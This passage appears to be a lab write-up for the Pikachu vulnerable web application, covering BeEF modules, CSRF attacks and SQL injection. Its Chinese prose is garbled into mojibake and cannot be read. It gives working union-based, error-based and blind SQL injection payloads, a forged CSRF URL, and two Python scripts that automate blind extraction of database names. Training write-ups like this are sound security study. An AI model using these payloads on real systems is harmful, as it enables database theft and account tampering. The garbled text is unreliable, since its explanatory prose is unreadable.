&gt;\n\nè¿™é‡Œæœ‰å¾ˆå¤šæ¯”è¾ƒå¥½ç©çš„åŠŸèƒ½å¯ä»¥ç©ä¸€ç©è¿™é‡Œè¿˜æ˜¯å‚è€ƒé‚£ä½å¤§ä½¬çš„\n\næ¨¡å—å‘½ä»¤çš„ä½¿ç”¨å’Œæ¨¡å—çš„ä½œç”¨ç§ç±»Broserï¼šä¸»è¦æ˜¯é’ˆå¯¹æµè§ˆå™¨çš„ä¸€äº›ä¿¡æ¯æ”¶é›†æˆ–æ”»å‡»ï¼Œå…¶ä¸‹çš„å­é€‰é¡¹å¡Hooked Domainä¸»è¦æ˜¯è·å–HTTPå±æ€§å€¼ï¼Œæ¯”å¦‚cookieã€è¡¨å•å€¼ç­‰ï¼Œè¿˜å¯ä»¥åšå†™ç®€å•çš„æµè§ˆå™¨æ“ä½œï¼Œæ¯”å¦‚æ›¿æ¢hrefå€¼ï¼Œå¼¹å‡ºè­¦å‘Šæ¡†ï¼Œé‡å®šå‘æµè§ˆå™¨ç­‰ã€‚è¿™ä¸ªé€‰é¡¹å¡ä¸‹çš„æœ‰äº›æ¨¡å—ä¼šæ ¹æ®å—å®³è€…çš„æµè§ˆå™¨æ¥å†³å®šæ˜¯å¦æ˜¾ç¤ºã€‚ä¸»è¦æ˜¯æµè§ˆå™¨é€šç”¨æ“ä½œå’Œå…¶ä»–åŸºæœ¬ä¿¡æ¯æ£€æµ‹ã€‚Chrome extensionsï¼šä¸»è¦æ˜¯é’ˆå¯¹è°·æ­Œæµè§ˆå™¨æ‰©å±•æ’ä»¶Debugï¼šè°ƒè¯•åŠŸèƒ½Exploitsï¼šæ¼æ´åˆ©ç”¨ï¼Œä¸»è¦åˆ©ç”¨ä¸€äº›å·²å…¬å¼€çš„æ¼æ´è¿›è¡Œæ”»å‡»æµ‹è¯•Hostï¼šé’ˆå¯¹ä¸»æœºï¼Œæ¯”å¦‚æ£€æµ‹ä¸»æœºçš„æµè§ˆå™¨ã€ç³»ç»Ÿä¿¡æ¯ã€IPåœ°å€ã€å®‰è£…è½¯ä»¶ç­‰ç­‰IPECï¼šåè®®é—´é€šä¿¡ã€‚ä¸»è¦æ˜¯ç”¨æ¥è¿æ¥ã€æ§åˆ¶å—å®³è€…æµè§ˆå™¨çš„Metasploitï¼šBeefå¯é€šè¿‡é…ç½®å’Œmetasploitå¹³å°è”åˆï¼Œä¸€æ—¦æœ‰å—å®³è€…å‡ºç°ï¼Œå¯é€šè¿‡ä¿¡æ¯æ”¶é›†ç¡®å®šæ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œè¿›ä¸€æ­¥æ–¹ä¾¿metasploitæ”»å‡»æµ‹è¯•Miscï¼šæ‚é¡¹ã€‚Networkï¼šç½‘ç»œæ‰«æPersistenceï¼šç»´æŠ¤å—å®³è€…è®¿é—®Phonegapï¼šæ‰‹æœºæµ‹è¯•Social engineeringï¼šç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»\nå…¶ä¸­ï¼šç»¿è‰²æ¨¡å—ï¼šå¯ä»¥æ‰§è¡Œä¸”ç›®æ ‡ä¸å¯è§çº¢è‰²æ¨¡å—ï¼šä¸é€‚åˆå½“å‰ç›®æ ‡æ©™è‰²æ¨¡å—ï¼šå¯ä»¥æ‰§è¡Œä½†ç›®æ ‡å¯è§ç°è‰²æ¨¡å—ï¼šæœªåœ¨ç›®æ ‡æµè§ˆå™¨ä¸Šæµ‹è¯•è¿‡\n\nCSRF\nCSRF(è·¨ç«™è¯·æ±‚ä¼ªé€ )æ¦‚è¿°\nCross-site request forgery ç®€ç§°ä¸ºâ€œCSRFâ€ï¼Œåœ¨CSRFçš„æ”»å‡»åœºæ™¯ä¸­æ”»å‡»è€…ä¼šä¼ªé€ ä¸€ä¸ªè¯·æ±‚ï¼ˆè¿™ä¸ªè¯·æ±‚ä¸€èˆ¬æ˜¯ä¸€ä¸ªé“¾æ¥ï¼‰ï¼Œç„¶åæ¬ºéª—ç›®æ ‡ç”¨æˆ·è¿›è¡Œç‚¹å‡»ï¼Œç”¨æˆ·ä¸€æ—¦ç‚¹å‡»äº†è¿™ä¸ªè¯·æ±‚ï¼Œæ•´ä¸ªæ”»å‡»å°±å®Œæˆäº†ã€‚æ‰€ä»¥CSRFæ”»å‡»ä¹Ÿæˆä¸ºâ€one clickâ€æ”»å‡»ã€‚ å¾ˆå¤šäººæä¸æ¸…æ¥šCSRFçš„æ¦‚å¿µï¼Œç”šè‡³æœ‰æ—¶å€™ä¼šå°†å…¶å’ŒXSSæ··æ·†,æ›´æœ‰ç”šè€…ä¼šå°†å…¶å’Œè¶Šæƒé—®é¢˜æ··ä¸ºä¸€è°ˆ,è¿™éƒ½æ˜¯å¯¹åŸç†æ²¡ææ¸…æ¥šå¯¼è‡´çš„ã€‚è¿™é‡Œåˆ—ä¸¾ä¸€ä¸ªåœºæ™¯è§£é‡Šä¸€ä¸‹ï¼Œå¸Œæœ›èƒ½å¤Ÿå¸®åŠ©ä½ ç†è§£ã€‚åœºæ™¯éœ€æ±‚ï¼šå°é»‘æƒ³è¦ä¿®æ”¹å¤§ç™½åœ¨è´­ç‰©ç½‘ç«™tianxiewww.xx.comä¸Šå¡«å†™çš„ä¼šå‘˜åœ°å€ã€‚å…ˆçœ‹ä¸‹å¤§ç™½æ˜¯å¦‚ä½•ä¿®æ”¹è‡ªå·±çš„å¯†ç çš„ï¼šç™»å½•â€”ä¿®æ”¹ä¼šå‘˜ä¿¡æ¯ï¼Œæäº¤è¯·æ±‚â€”ä¿®æ”¹æˆåŠŸã€‚æ‰€ä»¥å°é»‘æƒ³è¦ä¿®æ”¹å¤§ç™½çš„ä¿¡æ¯ï¼Œä»–éœ€è¦æ‹¥æœ‰ï¼š1ï¼Œç™»å½•æƒé™ 2ï¼Œä¿®æ”¹ä¸ªäººä¿¡æ¯çš„è¯·æ±‚ã€‚\nä½†æ˜¯å¤§ç™½åˆä¸ä¼šæŠŠè‡ªå·±xxxç½‘ç«™çš„è´¦å·å¯†ç å‘Šè¯‰å°é»‘ï¼Œé‚£å°é»‘æ€ä¹ˆåŠï¼Ÿäºæ˜¯ä»–è‡ªå·±è·‘åˆ°www.xx.comä¸Šæ³¨å†Œäº†ä¸€ä¸ªè‡ªå·±çš„è´¦å·ï¼Œç„¶åä¿®æ”¹äº†ä¸€ä¸‹è‡ªå·±çš„ä¸ªäººä¿¡æ¯ï¼ˆæ¯”å¦‚ï¼šE-mailåœ°å€ï¼‰ï¼Œä»–å‘ç°ä¿®æ”¹çš„è¯·æ±‚æ˜¯ï¼šã€http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Changeã€‘äºæ˜¯ï¼Œä»–å®æ–½äº†è¿™æ ·ä¸€ä¸ªæ“ä½œï¼šæŠŠè¿™ä¸ªé“¾æ¥ä¼ªè£…ä¸€ä¸‹ï¼Œåœ¨å°ç™½ç™»å½•xxxç½‘ç«™åï¼Œæ¬ºéª—ä»–è¿›è¡Œç‚¹å‡»ï¼Œå°ç™½ç‚¹å‡»è¿™ä¸ªé“¾æ¥åï¼Œä¸ªäººä¿¡æ¯å°±è¢«ä¿®æ”¹äº†,å°é»‘å°±å®Œæˆäº†æ”»å‡»ç›®çš„ã€‚\nä¸ºå•¥å°é»‘çš„æ“ä½œèƒ½å¤Ÿå®ç°å‘¢ã€‚æœ‰å¦‚ä¸‹å‡ ä¸ªå…³é”®ç‚¹ï¼š1.www.xxx.comè¿™ä¸ªç½‘ç«™åœ¨ç”¨æˆ·ä¿®æ”¹ä¸ªäººçš„ä¿¡æ¯æ—¶æ²¡æœ‰è¿‡å¤šçš„æ ¡éªŒï¼Œå¯¼è‡´è¿™ä¸ªè¯·æ±‚å®¹æ˜“è¢«ä¼ªé€ ;â€”å› æ­¤ï¼Œæˆ‘ä»¬åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦å­˜åœ¨CSRFæ¼æ´ï¼Œå…¶å®å°±æ˜¯åˆ¤æ–­å…¶å¯¹å…³é”®ä¿¡æ¯ï¼ˆæ¯”å¦‚å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯ï¼‰çš„æ“ä½œ(å¢åˆ æ”¹)æ˜¯å¦å®¹æ˜“è¢«ä¼ªé€ ã€‚2.å°ç™½ç‚¹å‡»äº†å°é»‘å‘ç»™çš„é“¾æ¥ï¼Œå¹¶ä¸”è¿™ä¸ªæ—¶å€™å°ç™½åˆšå¥½ç™»å½•åœ¨è´­ç‰©ç½‘ä¸Š;â€”å¦‚æœå°ç™½å®‰å…¨æ„è¯†é«˜ï¼Œä¸ç‚¹å‡»ä¸æ˜é“¾æ¥ï¼Œåˆ™æ”»å‡»ä¸ä¼šæˆåŠŸï¼Œåˆæˆ–è€…å³ä½¿å°ç™½ç‚¹å‡»äº†é“¾æ¥ï¼Œä½†å°ç™½æ­¤æ—¶å¹¶æ²¡æœ‰ç™»å½•è´­ç‰©ç½‘ç«™ï¼Œä¹Ÿä¸ä¼šæˆåŠŸã€‚â€”å› æ­¤ï¼Œè¦æˆåŠŸå®æ–½ä¸€æ¬¡CSRFæ”»å‡»ï¼Œéœ€è¦â€œå¤©æ—¶ï¼Œåœ°åˆ©ï¼Œäººå’Œâ€çš„æ¡ä»¶ã€‚å½“ç„¶ï¼Œå¦‚æœå°é»‘äº‹å…ˆåœ¨xxxç½‘çš„é¦–é¡µå¦‚æœå‘ç°äº†ä¸€ä¸ªXSSæ¼æ´ï¼Œåˆ™å°é»‘å¯èƒ½ä¼šè¿™æ ·åšï¼š æ¬ºéª—å°ç™½è®¿é—®åŸ‹ä¼äº†XSSè„šæœ¬ï¼ˆç›—å–cookieçš„è„šæœ¬ï¼‰çš„é¡µé¢ï¼Œå°ç™½ä¸­æ‹›ï¼Œå°é»‘æ‹¿åˆ°å°ç™½çš„cookieï¼Œç„¶åå°é»‘é¡ºåˆ©ç™»å½•åˆ°å°ç™½çš„åå°ï¼Œå°é»‘è‡ªå·±ä¿®æ”¹å°ç™½çš„ç›¸å…³ä¿¡æ¯ã€‚â€”æ‰€ä»¥è·Ÿä¸Šé¢æ¯”ä¸€ä¸‹ï¼Œå°±å¯ä»¥çœ‹å‡ºCSRFä¸XSSçš„åŒºåˆ«ï¼šCSRFæ˜¯å€Ÿç”¨æˆ·çš„æƒé™å®Œæˆæ”»å‡»ï¼Œæ”»å‡»è€…å¹¶æ²¡æœ‰æ‹¿åˆ°ç”¨æˆ·çš„æƒé™ï¼Œè€ŒXSSæ˜¯ç›´æ¥ç›—å–åˆ°äº†ç”¨æˆ·çš„æƒé™ï¼Œç„¶åå®æ–½ç ´åã€‚\nå› æ­¤ï¼Œç½‘ç«™å¦‚æœè¦é˜²æ­¢CSRFæ”»å‡»ï¼Œåˆ™éœ€è¦å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å¯¹åº”çš„å®‰å…¨æªæ–½ï¼Œé˜²æ­¢è¿™äº›æ“ä½œå‡ºç°è¢«ä¼ªé€ çš„æƒ…å†µï¼Œä»è€Œå¯¼è‡´CSRFã€‚æ¯”å¦‚ï¼šâ€“å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„tokenï¼›â€“å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå¢åŠ å®‰å…¨çš„éªŒè¯ç ï¼›â€“å¯¹æ•æ„Ÿä¿¡æ¯çš„æ“ä½œå®æ–½å®‰å…¨çš„é€»è¾‘æµç¨‹ï¼Œæ¯”å¦‚ä¿®æ”¹å¯†ç æ—¶ï¼Œéœ€è¦å…ˆæ ¡éªŒæ—§å¯†ç ç­‰ã€‚\nå¦‚æœä½ æ²¡æœ‰è¯»å¤ªæ˜ç™½,ä¸è¦çŠ¹è±«,è¯·å†è¯»ä¸€éå•¦\nä½ å¯ä»¥é€šè¿‡â€œCross-site request forgeryâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚\n\nCSRF(get)æ¯”è¾ƒç®€å•,bpèƒ½å®Œå…¨è§£å†³,éƒ½ä¸ç”¨è‡ªå·±å†™poc,burpsuiteç›´æ¥ä¸€é”®ç”Ÿæˆ\nå½“ç„¶,getè¯·æ±‚çš„ç”šè‡³éƒ½ä¸éœ€è¦bpç”Ÿæˆpoc,ç›´æ¥æ”¹urlå³å¯,è¿™é‡Œä¸¤ç§æ–¹æ³•éƒ½è¯´ä¸€ä¸‹å§\né¦–å…ˆæˆ‘ä»¬æ¥æŠ“ä¸ªåŒ…,å¯ä»¥å‘ç°getä¼ ä¿®æ”¹çš„å‚æ•°,urlé‡Œå°±æ˜¯æ‰€ä¿®æ”¹çš„ä¿¡æ¯,æˆ‘ä»¬copyä¸€ä¸‹,æŠŠå†…å®¹æ”¹æˆæˆ‘ä»¬æƒ³è¦çš„\næ¯”æ–¹è¯´è¿™é‡Œæˆ‘æ„é€ çš„æ˜¯è¿™ä¸ªhttp://localhost/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=110&amp;add=nba+lakes&amp;email=110%40pikachu.com&amp;submit=submit\nç„¶åæˆ‘ä»¬æŠŠè¿™ä¸ªurlå‘ç»™å¥½å‹kobe,å¹¶æ¬ºéª—ä»–è®¿é—®ä¸€ä¸‹\n\nå¯ä»¥çœ‹åˆ°,ä»–çš„ä¿¡æ¯å°±è¢«ä¿®æ”¹äº†\nç¬¬äºŒç§è¿˜æ˜¯æŠ“åŒ…ç„¶åé€šè¿‡bpç”Ÿæˆcsrf_poc\n\nè¿™é‡Œå‘¢å³ä¸Šè§’å¯ä»¥å‹¾é€‰è‡ªåŠ¨æäº¤çš„,å°±æ˜¯kobeä¸€è®¿é—®å°±ä¼šè‡ªåŠ¨æäº¤è¡¨å•ä¿®æ”¹ä»–çš„ä¿¡æ¯\nç„¶åç›´æ¥ç‚¹æµè§ˆå™¨æµ‹è¯•,å°±ä¼šç”Ÿæˆä¸€ä¸ªåœ°å€,è¿™ä¸ªåœ°å€å°±å¾ˆæœ‰éšè”½æ€§æ¯”å¦‚æˆ‘è¿™é‡Œæ˜¯http://burpsuite/show/2/hd7yrgsw6qmo867vq7h667rlct97o7sh\nåªè¦kobeè®¿é—®å®ƒ,ä»–å°±åˆä¼šè¢«æ”»å‡»äº†\nå£°æ˜ä¸€ä¸‹:è¿™é‡Œæ˜¯å–œæ¬¢kobeæ‰ä¼šç”¨ä»–çš„id,å¹¶ä¸æ˜¯æƒ³å»æ”»å‡»kobe,æˆ‘æƒ³pikachuçš„ä½œè€…åº”è¯¥ä¹Ÿæ˜¯å–œæ¬¢kobe\nCSRF(post)è¿™é‡Œå¾ˆæ˜æ˜¾ä¸Šè¿°ç¬¬ä¸€ç§æ–¹æ³•æ˜¯æ²¡æ³•ç”¨çš„,ä½†æ˜¯ç¬¬äºŒç§æ–¹æ³•è¿˜æ˜¯å¯ä»¥çš„,æˆ‘ä»¬å†é‡å¤ä¸€ä¸‹ä¸Šè¿°æ“ä½œå¾ˆå¿«å°±å¯ä»¥å®ç°\nCSRF Tokenè¿™é¢˜å¹¶æ²¡æœ‰æ‰¾åˆ°åˆ©ç”¨æ–¹æ³•,æˆ‘ä»¬å»ç¿»ä¸€ä¸‹å®ƒçš„æºä»£ç \nå°±æ˜¯è¯´æˆ‘ä»¬åœ¨è®¿é—®è¿™ä¸ªé¡µé¢çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªæ–°çš„token,é‚£æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªtokenæœ‰ä»€ä¹ˆè§„å¾‹å‘¢\n//ç”Ÿæˆä¸€ä¸ªtoken,ä»¥å½“å‰å¾®å¦™æ—¶é—´+ä¸€ä¸ª5ä½çš„å‰ç¼€function set_token()&#123;    if(isset($_SESSION[&#x27;token&#x27;]))&#123;       unset($_SESSION[&#x27;token&#x27;]);    &#125; //é‡Šæ”¾ä¸€ä¸ªtokenå¹¶ä¸”ç”Ÿæˆä¸€ä¸ª    $_SESSION[&#x27;token&#x27;]=str_replace(&#x27;.&#x27;,&#x27;&#x27;,uniqid(mt_rand(10000,99999),true));&#125;//uniqidç”Ÿæˆä¸€ä¸ªå”¯ä¸€ID  é€—å·åçš„trueæ˜¯more_entropyå¦‚æœè®¾ç½®ä¸ºTRUEï¼Œuniqid() ä¼šåœ¨è¿”å›çš„å­—ç¬¦ä¸²ç»“å°¾å¢åŠ é¢å¤–çš„ç†µï¼ˆä½¿ç”¨combined linear congruential generatorï¼‰ã€‚ä½¿å¾—å”¯ä¸€IDæ›´å…·å”¯ä¸€æ€§ã€‚//mt_rand éšæœºæ•°ç”Ÿæˆ\n\nå¾ˆæ˜æ˜¾è¿™ä¸ªtokenç”Ÿæˆçš„æ²¡æœ‰ä»»ä½•è§„å¾‹,ä¸€ç›´éƒ½åœ¨å¼ºè°ƒä¸€ä¸ªrandom\nè¿™é¢˜tokenå†™çš„å¾ˆä¸é”™,æˆ‘æ²¡æœ‰æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„æ–¹æ³•,åœ¨ç½‘ä¸Šçœ‹äº†å¾ˆå¤šå¤§ä½¬çš„wp,å¤§éƒ¨åˆ†æ˜¯è§£é‡Šè¯´è¿™ä¸ªtokenå¯ä»¥é˜²æ­¢csrf,ä¹Ÿæœ‰å¤§ä½¬è¯´æ˜¯è¿™ä¸ªtokenå¯ä»¥åƒä¸Šè¾¹tokené˜²çˆ†ç ´?é‚£é¢˜ä¸€æ ·å»çˆ†ç ´token,ä½†æ˜¯ä»”ç»†æƒ³ä¸€ä¸‹æˆ‘ä»¬æ€ä¹ˆæ‰èƒ½æå‰çŒœåˆ°è¢«æ”»å‡»è€…çš„token,æˆ‘ä»¬æ‰€è¿›è¡Œçš„çˆ†ç ´éƒ½æ˜¯æ”»å‡»è€…ä¸»åŠ¨å»çˆ†ç ´çš„,æˆ‘ä»¬ä¸èƒ½è®©å—å®³è€…å»ä¸»åŠ¨çˆ†ç ´token,ä½†æ˜¯å—å®³è€…ä¸çˆ†ç ´token,æˆ‘ä»¬åˆçŒœä¸åˆ°ä»–çš„token,æ‰€ä»¥åªèƒ½æ”¾å¼ƒ.æˆ‘æƒ³å”¯ä¸€çš„æ–¹æ³•å¤§æ¦‚å°±æ˜¯ç»™å—å®³è€…å‘ä¸€ä¸ªçˆ†ç ´tokençš„è„šæœ¬è®©ä»–æ‰§è¡Œ,é‚£æˆ‘ä»¬ä¸ºä»€ä¹ˆä¸ç›´æ¥ç•™åé—¨ğŸ¤£\nSql Inject(SQLæ³¨å…¥)\nåœ¨owaspå‘å¸ƒçš„top10æ’è¡Œæ¦œé‡Œï¼Œæ³¨å…¥æ¼æ´ä¸€ç›´æ˜¯å±å®³æ’åç¬¬ä¸€çš„æ¼æ´ï¼Œå…¶ä¸­æ³¨å…¥æ¼æ´é‡Œé¢é¦–å½“å…¶å†²çš„å°±æ˜¯æ•°æ®åº“æ³¨å…¥æ¼æ´ã€‚ä¸€ä¸ªä¸¥é‡çš„SQLæ³¨å…¥æ¼æ´ï¼Œå¯èƒ½ä¼šç›´æ¥å¯¼è‡´ä¸€å®¶å…¬å¸ç ´äº§ï¼SQLæ³¨å…¥æ¼æ´ä¸»è¦å½¢æˆçš„åŸå› æ˜¯åœ¨æ•°æ®äº¤äº’ä¸­ï¼Œå‰ç«¯çš„æ•°æ®ä¼ å…¥åˆ°åå°å¤„ç†æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„åˆ¤æ–­ï¼Œå¯¼è‡´å…¶ä¼ å…¥çš„â€œæ•°æ®â€æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­åï¼Œè¢«å½“ä½œSQLè¯­å¥çš„ä¸€éƒ¨åˆ†æ‰§è¡Œã€‚ ä»è€Œå¯¼è‡´æ•°æ®åº“å—æŸï¼ˆè¢«è„±è£¤ã€è¢«åˆ é™¤ã€ç”šè‡³æ•´ä¸ªæœåŠ¡å™¨æƒé™æ²¦é™·ï¼‰ã€‚\nåœ¨æ„å»ºä»£ç æ—¶ï¼Œä¸€èˆ¬ä¼šä»å¦‚ä¸‹å‡ ä¸ªæ–¹é¢çš„ç­–ç•¥æ¥é˜²æ­¢SQLæ³¨å…¥æ¼æ´ï¼š1.å¯¹ä¼ è¿›SQLè¯­å¥é‡Œé¢çš„å˜é‡è¿›è¡Œè¿‡æ»¤ï¼Œä¸å…è®¸å±é™©å­—ç¬¦ä¼ å…¥ï¼›2.ä½¿ç”¨å‚æ•°åŒ–ï¼ˆParameterized Query æˆ– Parameterized Statementï¼‰ï¼›3.è¿˜æœ‰å°±æ˜¯,ç›®å‰æœ‰å¾ˆå¤šORMæ¡†æ¶ä¼šè‡ªåŠ¨ä½¿ç”¨å‚æ•°åŒ–è§£å†³æ³¨å…¥é—®é¢˜,ä½†å…¶ä¹Ÿæä¾›äº†â€æ‹¼æ¥â€çš„æ–¹å¼,æ‰€ä»¥ä½¿ç”¨æ—¶éœ€è¦æ…é‡!\nSQLæ³¨å…¥åœ¨ç½‘ç»œä¸Šéå¸¸çƒ­é—¨ï¼Œä¹Ÿæœ‰å¾ˆå¤šæŠ€æœ¯ä¸“å®¶å†™è¿‡éå¸¸è¯¦ç»†çš„å…³äºSQLæ³¨å…¥æ¼æ´çš„æ–‡ç« ï¼Œè¿™é‡Œå°±ä¸åœ¨å¤šå†™äº†ã€‚ä½ å¯ä»¥é€šè¿‡â€œSql Injectâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚\n\næ•°å­—å‹æ³¨å…¥postå‹,æŠ“ä¸€ä¸‹åŒ…,ç›´æ¥å¼€æ‰“,ä¸¤ä¸ªå›æ˜¾ä½\n1%20union%20select%201%2C(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%3Ddatabase())%20limit%200%2C1\nç„¶åç»§ç»­æ‰“1%20union%20select%201%2C(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name%3D&#39;users&#39;)%20limit%201%2C1\nç°åœ¨å¼€å§‹æŸ¥ä»–çš„å†…å®¹1%20union%20select%201%2C(select%20(group_concat(username%2Cpassword)))%20from%20users%20limit%201%2C1\n\nå­—ç¬¦å‹æ³¨å…¥åŠ äº†ä¸ªå•å¼•å·è€Œå·²,é€šè¿‡ï¼ƒæ³¨é‡Š,ç»§ç»­ä¸Šä¸€é¢˜çš„payloadè¿™é‡Œä¸å†æµªè´¹æ—¶é—´\næœç´¢å‹æ³¨å…¥çœ‹è§æœç´¢æ¡†æˆ‘ä»¬å…ˆæ¥è¯•ä¸€ä¸‹xss\nç„¶åå°±æ‹¿åˆ°äº†sqlè¯­å¥åè¾¹æ˜¯%&#39;\n$query=&quot;select username,id,email from member where username like &#x27;%$name%&#x27;&quot;;\n\næºç ä¹Ÿç¡®å®å¦‚æ­¤,è¿˜æ˜¯è€å¥—è·¯ç»§ç»­æ‰“\nxxxå‹æ³¨å…¥$query=&quot;select id,email from member where username=(&#x27;$name&#x27;)&quot;;\n\nåªæ˜¯æ¢äº†ç§é—­åˆæ–¹å¼,æ¢æ±¤ä¸æ¢è¯\nâ€œinsert/updateâ€æ³¨å…¥\nç™»é™†ç•Œé¢æ˜¯æ— æ³•æ³¨å…¥,æˆ‘ä»¬æ³¨å†Œç™»å½•ä¸€ä¸‹,è¿™é‡Œçš„æŠ¥é”™æ³¨å…¥æ˜¯å¯ä»¥ç”¨çš„&#39; or updatexml(1, concat(0x7e, database()), 0)#\nè¯¦æƒ…å¯å‚è€ƒè¿™ç¯‡,è¿™é‡Œä¸å†é‡å¤\nâ€œdeleteâ€æ³¨å…¥è¿™é‡Œåˆ é™¤å‘ç°æ²¡ä»€ä¹ˆç”¨,æŠ“åŒ…ä¸€çœ‹åŸæ¥æ³¨å…¥ç‚¹åœ¨è¿™\n\næ‹¿ä¸‹\nhttpå¤´æ³¨å…¥\nè·Ÿä¸Šè¾¹insertæ³¨å…¥ä¸€æ ·,å°±æ˜¯æ¢äº†æ¢åœ°æ–¹payload: &#39; or updatexml(1,concat(0x7e,(select database())),1)or&#39;\n\nåŸºäºbooliançš„ç›²æ³¨é¦–å…ˆç”¨kobe&#39; and length(database())&gt;10 #åˆ¤æ–­å‡ºæ•°æ®åº“åçš„é•¿åº¦\nç»è¿‡å‡ æ¬¡å°è¯•æˆ‘ä»¬å¯ä»¥æ‹¿åˆ°æ•°æ®åº“é•¿åº¦ä¸º7\nç„¶åæˆ‘ä»¬æ¥ä¸ªpyè„šæœ¬æ³¨ä¸€ä¸‹\nimport requestsurl = &quot;http://localhost/vul/sqli/sqli_blind_b.php?name=&quot;users = &quot;abcdefghijklmnopqrstuvwxyz&quot;user = &quot;&quot;for i in range(8):    for u in users:        data = &quot;kobe&#x27;%20and%20if(substr(database()%2C&#123;&#125;%2C1)%20%3D%20&#x27;&#123;&#125;&#x27;%2C1%2C(select%20table_name%20from%20information_schema.tables))%23&amp;submit=%E6%9F%A5%E8%AF%A2&quot;.format(i,u)        # data=&#123;        # &quot;id&quot;:&quot;123&#x27; or substr(username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; and id = 1#&quot;.format(i,u),        # &#125;        response = requests.get(url=url+data)        if &quot;your uid:3&quot; in response.text:            user += u            break    print(&quot;æ­£åœ¨ç›²æ³¨ç¬¬&#123;&#125;ä½&quot;.format(i))print(&quot;æ•°æ®åº“å:&quot;+user)\n\nä¹Ÿå¯ä»¥ç”¨bpçˆ†ç ´,æŠ“åŒ…,ç„¶åå‘åˆ°intruder,ç„¶åæ‰“ä¸Šæˆ‘ä»¬çš„payload,è®¾ä¸€ä¸‹è¿™ä¸¤ä¸ªä½ç½®\nç„¶åä¸¤ä¸ªä½ç½®åˆ†åˆ«æ˜¯æ•°å­—å’Œå­—æ¯\n\nè¿™é‡Œçš„1-7å°±åˆšå¥½æ˜¯æˆ‘ä»¬æ•°æ®åº“çš„åº“åé¡ºåº\n\nåŸºäºæ—¶é—´çš„ç›²æ³¨åŒboolç›²æ³¨,æˆ‘ä»¬å…ˆåˆ¤æ–­æ•°æ®åº“é•¿åº¦kobe&#39; and if (length(database()) &gt; 5 ,sleep(5),null) #\nimport requestsimport timeimport osurl = &quot;http://localhost/vul/sqli/sqli_blind_b.php?name=&quot;users = &quot;abcdefghijklmnopqrstuvwxyz&quot;user = &quot;&quot;for i in range(8):    for u in users:        prox= &#123;            &#x27;http&#x27;:&#x27;http://127.0.0.1:8080&#x27;        &#125;        data = &quot;kobe&#x27;%20and%20if%20(substr(database()%2C&#123;&#125;%2C1)%20%3D%20&#x27;&#123;&#125;&#x27;%2Csleep(5)%2Cnull)%23&amp;submit=%E6%9F%A5%E8%AF%A2&quot;.format(i,u)        # data=&#123;        # &quot;id&quot;:&quot;123&#x27; or substr(username,&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; and id = 1#&quot;.format(i,u),        # &#125;        # if &quot;your uid:3&quot; in response.text:        #     user += u        #     break        start_time = time.time()        response = requests.get(url=url + data,proxies=prox)        end_time = time.time()        t = end_time - start_time        if t &gt; 5:            user += u            break        print(data)    print(&quot;æ­£åœ¨ç›²æ³¨ç¬¬&#123;&#125;ä½&quot;.format(i)+format(u))    print(&quot;æ•°æ®åº“å:&quot;+user)\n\nå®½å­—èŠ‚æ³¨å…¥\nå®½å­—èŠ‚æ³¨å…¥æŒ‡çš„æ˜¯MySQLæ•°æ®åº“åœ¨ä½¿ç”¨å®½å­—èŠ‚(GBK)ç¼–ç æ—¶,ä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—(å‰ä¸€ä¸ªASCIIç è¦å¤§äº128(æ¯”å¦‚%df),æ‰åˆ°æ±‰å­—çš„èŒƒå›´),è€Œå½“æˆ‘ä»¬è¾“å…¥å•å¼•å·æ—¶,MySQLä¼šè°ƒç”¨è½¬ä¹‰å‡½æ•°,å°†å•å¼•å·å˜ä¸º\\&#39;,å…¶ä¸­çš„\\çš„åå…­è¿›åˆ¶æ˜¯%5c,MySQLçš„GBKç¼–ç ,ä¼šè®¤ä¸º%df%5cæ˜¯ä¸€ä¸ªå®½å­—èŠ‚,ä¹Ÿå°±æ˜¯é‹ä»è€Œä½¿å•å¼•å·é—­åˆ,è¿›è¡Œæ³¨å…¥.\nå®½å­—èŠ‚æ³¨å…¥å‘ç”Ÿçš„ä½ç½®å°±æ˜¯phpå‘é€è¯·æ±‚åˆ°MySQLæ—¶å­—ç¬¦ä½¿ç”¨character_set_clientè®¾ç½®å€¼è¿›è¡Œäº†ä¸€æ¬¡ç¼–ç ,ç„¶åæœåŠ¡å™¨ä¼šæ ¹æ®character_set_connenctionæŠŠè¯·æ±‚è¿›è¡Œè½¬ç ,ä»character_set_clientè½¬æˆcharacter_set_connection,ç„¶åæ›´æ–°åˆ°æ•°æ®åº“çš„æ—¶å€™,å†è½¬åŒ–æˆå­—æ®µæ‰€å¯¹åº”çš„ç¼–ç \n\nä¸‹è¿°æ•°æ®å˜åŒ–è¿‡ç¨‹\n%df%27===&gt;(addslashes)====&gt;%df%5c%27====&gt;(GBK)====&gt;é‹â€™ç”¨æˆ·è¾“å…¥==&gt;è¿‡æ»¤å‡½æ•°==&gt;ä»£ç 